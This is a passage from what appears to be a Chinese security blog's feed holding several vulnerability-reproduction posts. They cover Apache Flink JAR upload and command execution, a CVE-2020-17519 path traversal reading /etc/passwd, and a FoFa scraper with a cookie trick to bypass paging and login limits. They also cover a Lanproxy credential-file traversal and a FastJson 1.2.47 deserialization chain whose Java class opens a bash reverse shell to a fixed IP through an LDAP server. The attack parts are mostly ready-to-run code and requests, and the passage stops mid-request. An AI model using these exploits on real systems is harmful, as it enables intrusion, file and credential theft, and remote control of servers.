<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;flink-web-5a1a5e27-aa74-4900-9f1c-ad5af08f3d37</span><br></pre></td></tr></table></figure>

<h4 id="上传JAR文件"><a href="#上传JAR文件" class="headerlink" title="上传JAR文件"></a>上传JAR文件</h4><p>打包如下代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> π ~/Desktop ❯ javac Test.java</span><br><span class="line"> π ~/Desktop ❯ <span class="built_in">cd</span> dddd</span><br><span class="line"> π ~/Desktop/dddd ❯ jar -cvf dddd.jar Test.class</span><br><span class="line">已添加清单</span><br><span class="line">正在添加: Test.class(输入 = 1250) (输出 = 758)(压缩了 39%)</span><br><span class="line"> π ~/Desktop/dddd ❯</span><br><span class="line"> </span><br><span class="line"><span class="comment"># --------------------分隔符-----------------------</span></span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public <span class="function"><span class="title">Test</span></span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String o = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String cmd = args[0];</span><br><span class="line">        ProcessBuilder p;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            p = new ProcessBuilder(new String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String pty = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ((new File(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                pty = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = new ProcessBuilder(new String[]&#123;pty, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Process s = p.start();</span><br><span class="line">        Scanner c = (new Scanner(s.getInputStream())).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上传EXP(dddd.jar)文件到<code>/tmp/flink-web-5a1a5e27-aa74-4900-9f1c-ad5af08f3d37/flink-web-upload</code>目录下，</p>
<p><img src="/posts/87dcd60b/image-20210108165729454.png" alt="image-20210108165729454"></p>
<h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /jars/dddd.jar/run?entry-class=Test&amp;program-args=%22ping%20-c%204%20ibrzca.dnslog.cn%22 HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:8081/</span><br><span class="line">Cookie: Idea-ebfc5b99=abcb5f88-d377-4462-9749-1fb24350d578</span><br></pre></td></tr></table></figure>

<p><img src="/posts/87dcd60b/image-20210108171419590.png" alt="image-20210108171419590"></p>
<p><a href="Apache-Flink-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-%E8%AF%BB%E5%8F%96/dddd.jar">dddd.jar</a></p>
<h1 id="CVE-2020-17519-Apache-Flink任意文件读取"><a href="#CVE-2020-17519-Apache-Flink任意文件读取" class="headerlink" title="CVE-2020-17519(Apache Flink任意文件读取)"></a>CVE-2020-17519(Apache Flink任意文件读取)</h1><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081//jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>



<p><img src="/posts/87dcd60b/image-20210111093558712.png" alt="image-20210111093558712"></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>Apache Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>FoFa脚本</title>
    <url>/posts/f2b0d565/</url>
    <content><![CDATA[<p>FoFa爬虫，主要是没有米，API的不合适。文章内有没米的可白嫖一种方法。。。。。。无需会员一万条。。</p>
<a id="more"></a>

<h1 id="FoFa的勤劳脚本"><a href="#FoFa的勤劳脚本" class="headerlink" title="FoFa的勤劳脚本"></a>FoFa的勤劳脚本</h1><p><strong>即便只有五页，还是想做个爬虫。。。。。。</strong></p>
<p>简述：没米，又发现大都是基于API查询的，因为没有找到合适的脚本，所以自己写了一下。发表之前在论坛搜了搜，发现了个有趣的东西，可白嫖FoFa。。。<span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3RocmVhZC01OTMzNi0xLTQuaHRtbA==">https://www.t00ls.net/thread-59336-1-4.html<i class="fa fa-external-link-alt"></i></span><br>虽然他提前写好了，emm ,不过我还是自己来吧。</p>
<ul>
<li>获取URL、IP、IPLocal、Server、TITLE，并进行标号ID</li>
<li>根据论坛中老哥的方法，使用Cookie中<code>result_per_page=N</code>来白嫖N条（N&lt;10000）。</li>
<li>为了不触发反爬机制，每爬取1页，sleep 1s;爬取3页，再sleep  3s。</li>
</ul>
<p>可使用<code>python3  fofa_search.py 10 &quot;baidu.com&quot; &quot;_fofapro_ars_session=xx&quot; | tee  x.txt</code> 来边输出边保存</p>
<p>BUG：尝试了每次指定一页2000条数据时，会有部分无法匹配出来- - (默认Cookie中result_per_page设置了2000，如果该方法失效，直接删除，只保留cookie变量即可。)</p>
<h2 id="Nday"><a href="#Nday" class="headerlink" title="Nday"></a>Nday</h2><ol>
<li>使用Cookie中result_per_page=N来白嫖N条（N&lt;10000）。</li>
<li>Cookie随意指定，即可，算是未授权。（_fofapro_ars_session=a）即可绕过登陆限制</li>
</ol>
<p><img src="/posts/f2b0d565/87391610965447_.pic_hd.jpg" alt="87391610965447_.pic_hd"></p>
<h2 id="正常示例："><a href="#正常示例：" class="headerlink" title="正常示例："></a>正常示例：</h2><p><img src="/posts/f2b0d565/c.png" alt="c"></p>
<p><img src="/posts/f2b0d565/d.png" alt="d"></p>
<p><img src="/posts/f2b0d565/e.png" alt="e"></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># auth: oudeniu</span></span><br><span class="line"><span class="comment"># time: 2020-1-18</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fofa</span>(<span class="params">num,url,cookie</span>):</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;https://fofa.so/result?qbase64=&#x27;</span> + base64.b64encode(url.encode()).decode()</span><br><span class="line">    print(<span class="string">&#x27;[URL]: &#x27;</span> + url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:cookie + <span class="string">&#x27;;result_per_page=2100&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    id = <span class="number">1</span> <span class="comment"># 顺序输出，统计多少个</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>,int(num)+<span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 每爬取1页，sleep 1s;每爬取3页，则sleep  3s; ####可视情况而定，太快会触发反爬机制。</span></span><br><span class="line">            <span class="keyword">if</span> int(page)%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                time.sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="comment"># print(url + &#x27;&amp;page=&#x27; + str(page))</span></span><br><span class="line">            html = requests.get(url + <span class="string">&#x27;&amp;page=&#x27;</span> + str(page),headers=headers,timeout=<span class="number">15</span>).text</span><br><span class="line">            <span class="comment"># 保存源码，本地分析</span></span><br><span class="line">            <span class="comment"># with open(str(id)+&#x27;.txt&#x27;,&#x27;w&#x27;)as f:</span></span><br><span class="line">            <span class="comment">#     f.write(html)</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="comment"># print(html)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;普通用户只能翻5页&quot;</span> <span class="keyword">in</span> html:</span><br><span class="line">                exit(<span class="string">&quot;[Error]: 普通用户只能翻5页!!!&quot;</span>)</span><br><span class="line">            <span class="comment"># print(html)</span></span><br><span class="line">            </span><br><span class="line">                <span class="comment"># 第一次正则，问题：有的没有title,</span></span><br><span class="line">                <span class="comment"># result = re.findall(r&#x27;&lt;div class=&quot;re-domain&quot;&gt;.*?&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&gt;.*?&lt;div class=&quot;time&quot;&gt;(.*?)&lt;/div&gt;.*?&lt;div&gt;&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&lt;/div&gt;.*?&lt;img class=&quot;nation-icon&quot; src=&quot;.*?&lt;a class=.*?&quot;&gt;(.*?)&lt;/a&gt;.*?&lt;div class=&quot;com-tag-wrap clearfix&quot;&gt;.*?class=&quot;f-tags-com&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;,html, re.S)</span></span><br><span class="line">                <span class="comment"># print(result)</span></span><br><span class="line">                <span class="comment"># 第二次正则，分开title, 问题：有的没有服务</span></span><br><span class="line">                <span class="comment"># res = re.findall(r&#x27;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&gt;.*?&lt;div&gt;&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&lt;/div&gt;.*?&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;.*?class=&quot;f-tags-com&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;,html,re.S)</span></span><br><span class="line">                <span class="comment"># title = re.findall(r&#x27; &lt;!-- 网站标题 --&gt;.*?&lt;div class=&quot;time&quot;&gt;(.*?)&lt;/div&gt;&#x27;,html,re.S)</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 第三次正则，分开title和server   可行 OK</span></span><br><span class="line">            res = re.findall(<span class="string">r&#x27;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&gt;.*?&lt;div&gt;&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&lt;/div&gt;.*?&lt;a class=&quot;second&quot; href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,html,re.S)</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                title = re.findall(<span class="string">r&#x27;&lt;!-- 网站标题 --&gt;.*?&lt;div class=&quot;time&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>,html,re.S)</span><br><span class="line">                </span><br><span class="line">                server = re.findall(<span class="string">r&#x27;&lt;!-- 网站索引包含server --&gt;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,html,re.S)</span><br><span class="line">                <span class="comment"># print(re.sub(r&#x27;&lt;.*&gt;&#x27;,&#x27;&#x27;,i))</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> i,t <span class="keyword">in</span> enumerate(title):</span><br><span class="line">                    s = re.sub(<span class="string">r&#x27;&lt;.*&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,server[i].strip())</span><br><span class="line">                    <span class="comment"># 没有title时，会匹配到一串字符，关键字为：ASN  second</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;ASN&#x27;</span> <span class="keyword">in</span> t <span class="keyword">or</span> <span class="string">&#x27;second&#x27;</span> <span class="keyword">in</span> t:</span><br><span class="line">                        <span class="comment"># 没有server时，会匹配到一串字符，将其中关键内容替换掉，就为空，然后需要替换掉\n,</span></span><br><span class="line">                        <span class="keyword">if</span> s:</span><br><span class="line">                            print(str(id).center(<span class="number">5</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">0</span>].strip().ljust(<span class="number">30</span>)  + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">1</span>].ljust(<span class="number">15</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">2</span>][:<span class="number">4</span>].center(<span class="number">10</span>) + <span class="string">&#x27; | &#x27;</span> + s.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).strip()[:<span class="number">20</span>].ljust(<span class="number">20</span>)+ <span class="string">&#x27; | &#x27;</span> + <span class="string">&#x27;NULL&#x27;</span>.ljust(<span class="number">20</span>))</span><br><span class="line">                            id = id+<span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:                   </span><br><span class="line">                            print(str(id).center(<span class="number">5</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">0</span>].strip().ljust(<span class="number">30</span>)  + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">1</span>].ljust(<span class="number">15</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">2</span>][:<span class="number">4</span>].center(<span class="number">10</span>) + <span class="string">&#x27; | &#x27;</span> + <span class="string">&#x27;NULL&#x27;</span>.ljust(<span class="number">20</span>)+ <span class="string">&#x27; | &#x27;</span> + <span class="string">&#x27;NULL&#x27;</span>.ljust(<span class="number">20</span>))</span><br><span class="line">                            id = id+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> s:</span><br><span class="line">                            print(str(id).center(<span class="number">5</span>) + <span class="string">&#x27; | &#x27;</span>  + res[i][<span class="number">0</span>].strip().ljust(<span class="number">30</span>)  + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">1</span>].ljust(<span class="number">15</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">2</span>][:<span class="number">4</span>].center(<span class="number">10</span>-len(res[i][<span class="number">2</span>][:<span class="number">4</span>])) + <span class="string">&#x27; | &#x27;</span> + s.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).strip()[:<span class="number">20</span>].ljust(<span class="number">20</span>) + <span class="string">&#x27; | &#x27;</span> + t[:<span class="number">20</span>].ljust(<span class="number">20</span>))</span><br><span class="line">                            id = id +<span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            print(str(id).center(<span class="number">5</span>) + <span class="string">&#x27; | &#x27;</span>  + res[i][<span class="number">0</span>].strip().ljust(<span class="number">30</span>)  + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">1</span>].ljust(<span class="number">15</span>) + <span class="string">&#x27; | &#x27;</span> + res[i][<span class="number">2</span>][:<span class="number">4</span>].center(<span class="number">10</span>-len(res[i][<span class="number">2</span>][:<span class="number">4</span>])) + <span class="string">&#x27; | &#x27;</span> + <span class="string">&#x27;NULL&#x27;</span>.ljust(<span class="number">20</span>) + <span class="string">&#x27; | &#x27;</span> + t[:<span class="number">20</span>].ljust(<span class="number">20</span>))</span><br><span class="line">                            id = id +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exit(<span class="string">&quot;[NULL]: over NO result!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        exit(<span class="string">&quot;[Error] &quot;</span> + str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    baner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string">_____________________________________</span></span><br><span class="line"><span class="string">s ___           ___        ___       |</span></span><br><span class="line"><span class="string">s(  _`\        (  _`\     (  _`\     |</span></span><br><span class="line"><span class="string">s| |_) ) _   _ | (_(_)_   | (_(_)_ _ |</span></span><br><span class="line"><span class="string">s| ,__/&#x27;( ) ( )|  _)/&#x27;_`\ |  _)/&#x27;_` )|</span></span><br><span class="line"><span class="string">s| |    | (_) || | ( (_) )| | ( (_| ||</span></span><br><span class="line"><span class="string">s(_)    `\__, |(_) `\___/&#x27;(_) `\__,_)|</span></span><br><span class="line"><span class="string">s       ( )_| |                      |</span></span><br><span class="line"><span class="string">s       `\___/&#x27;                      |</span></span><br><span class="line"><span class="string">s                    time:2021-1-18  |</span></span><br><span class="line"><span class="string">-----------+++++++++++++-------------</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    print(baner)</span><br><span class="line">    num = url = cookie= <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        args = sys.argv[<span class="number">1</span>:<span class="number">4</span>]</span><br><span class="line">        num = args[<span class="number">0</span>]</span><br><span class="line">        url = args[<span class="number">1</span>]</span><br><span class="line">        cookie = args[<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(args)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="string">&#x27;[Eg]: python3 fofa_search.py &lt;PagesNum&gt; &lt;SearchInfo&gt; &lt;Cookie&gt;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;python3 fofa_search.py 3 \&quot;百度\&quot; \&quot;session=asasa\&quot;&#x27;</span>)</span><br><span class="line">    get_fofa(num,url,cookie)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>FoFa</tag>
      </tags>
  </entry>
  <entry>
    <title>Lanproxy任意文件读取(CVE-2021-3019)</title>
    <url>/posts/e603ef6a/</url>
    <content><![CDATA[<p>Lanproxy是ffay个人开发者的一个可将局域网内服务代理到公网的内网穿透工具。被爆出任意文件读取。。</p>
<a id="more"></a>

<h1 id="CVE-2021-3019：Lanproxy任意文件读取"><a href="#CVE-2021-3019：Lanproxy任意文件读取" class="headerlink" title="CVE-2021-3019：Lanproxy任意文件读取"></a>CVE-2021-3019：Lanproxy任意文件读取</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Lanproxy 0.1 存在路径遍历漏洞，该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据。</p>
<p><img src="/posts/e603ef6a/image-20210119092212627.png" alt="image-20210119092212627"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">访问服务页面管理地址，抓包</span><br><span class="line">利用 ../进行路径遍历读取文件</span><br><span class="line">例如 ../conf/config.properties</span><br></pre></td></tr></table></figure>



<p><img src="/posts/e603ef6a/image-20210119092022356.png" alt="image-20210119092022356"></p>
<h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/ffay/lanproxy/commits/master</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>漏洞复现</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson 1.2.47 反序列化复现</title>
    <url>/posts/32c3cb6e/</url>
    <content><![CDATA[<p>FASTJSON……反序列化利用。。。</p>
<a id="more"></a>



<h2 id="FastJson-lt-1-2-47-反序列化复现"><a href="#FastJson-lt-1-2-47-反序列化复现" class="headerlink" title="FastJson &lt; 1.2.47 反序列化复现"></a>FastJson &lt; 1.2.47 反序列化复现</h2><p>有时间再重写工具。暂时手工进行吧。</p>
<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol>
<li>安装docker</li>
<li>下载vulhub，运行fastjson 1.2.47环境。</li>
<li>配置JAVA环境，版本和<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21iZWNobGVyL21hcnNoYWxzZWMlRTQlQjglQURwb20ueG1sJUU3JTlBJTg0JUU0JUI4JTgwJUU4JTg3JUI0">https://github.com/mbechler/marshalsec中pom.xml的一致<i class="fa fa-external-link-alt"></i></span></li>
<li>配置JAVA_HOME </li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MAC下配置</span></span><br><span class="line">/usr/libexec/java_home</span><br><span class="line">vim .zshrc</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=<span class="string">&quot;/Library/Java/JavaVirtualMachines/jdk1.8.0_251.jdk/Contents/Home&quot;</span></span><br><span class="line"><span class="built_in">source</span> ../../../../.zshrc</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec</span><br><span class="line">mvn install <span class="comment"># 报错，继续执行下列命令</span></span><br><span class="line">mvn compiler:compile</span><br><span class="line">mvn org.apache.maven.plugins:maven-compiler-plugin:compile</span><br><span class="line">mvn org.apache.maven.plugins:maven-compiler-plugin:2.0.2:compile</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>

<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="第一步：脚本"><a href="#第一步：脚本" class="headerlink" title="第一步：脚本"></a>第一步：脚本</h3><p>准备漏洞利用脚本</p>
<ul>
<li>修改脚本使用bash反弹。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;whoami&quot;&#125;);</span></span><br><span class="line">      Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/192.168.30.51/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编译,注意文件名个类名一致。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<h3 id="第二步：RMI-LADP"><a href="#第二步：RMI-LADP" class="headerlink" title="第二步：RMI/LADP"></a>第二步：RMI/LADP</h3><p>准备marshalsec启动一个RMI服务器，或者ladp服务器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec</span><br><span class="line">mvn install <span class="comment"># 报错，继续执行下列命令</span></span><br><span class="line">mvn compiler:compile</span><br><span class="line">mvn org.apache.maven.plugins:maven-compiler-plugin:compile</span><br><span class="line">mvn org.apache.maven.plugins:maven-compiler-plugin:2.0.2:compile</span><br><span class="line">mvn clean package -DskipTests</span><br><span class="line"><span class="comment"># 编译好了在target目录下</span></span><br></pre></td></tr></table></figure>

<h3 id="第三步：HTTP服务器"><a href="#第三步：HTTP服务器" class="headerlink" title="第三步：HTTP服务器"></a>第三步：HTTP服务器</h3><ul>
<li>启用HTTP服务，根目录放Exploit.class</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server  <span class="comment"># 默认当前文件夹开启HTTP，端口默认8000</span></span><br></pre></td></tr></table></figure>

<ul>
<li>开启LDAP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.30.51:8000/#Exploit&quot;</span> 9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># 理论上RIMI不行。</span></span><br><span class="line"><span class="comment"># java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://x.x.x.x/#Exploit&quot; 9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果采用了RMI，使用如下代码。POST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://x.x.x.x/:9999/Exploit&quot;</span>, </span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>开启NC监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>

<h3 id="第四步：利用"><a href="#第四步：利用" class="headerlink" title="第四步：利用"></a>第四步：利用</h3><p>访问主页，Burp抓包。修改请求,发送即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Length: 277</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span 